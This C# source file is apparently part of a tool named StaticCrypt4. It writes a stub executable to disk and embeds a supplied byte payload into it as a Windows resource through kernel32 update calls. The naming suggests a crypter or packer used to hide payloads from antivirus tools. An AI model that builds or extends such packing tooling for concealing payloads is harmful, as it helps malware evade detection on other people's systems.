using System;
using System.IO;
using System.Runtime.InteropServices;

namespace StaticCrypt4.Utilies
{
	public static class PackerNET
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr BeginUpdateResource(string pFileName, [MarshalAs(UnmanagedType.Bool)] bool bDeleteExistingResources);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool UpdateResource(IntPtr hUpdate, int lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

		public static string Start(byte[] filename, byte[] bytes)
		{
			string text = FileUtils.StaticPath + "\\DotnetPack.exe";
			File.WriteAllBytes(text, filename);
			IntPtr hUpdate = BeginUpdateResource(text, false);
			if (!UpdateResource(hUpdate, 10, "STATIC", 0, GCHandle.Alloc(bytes, GCHandleType.Pinned).AddrOfPinnedObject(), Convert.ToUInt32(bytes.Length)))
			{
				return "";
			}
			if (!EndUpdateResource(hUpdate, false))
			{
				return "";
			}
			return text;
		}
	}
}
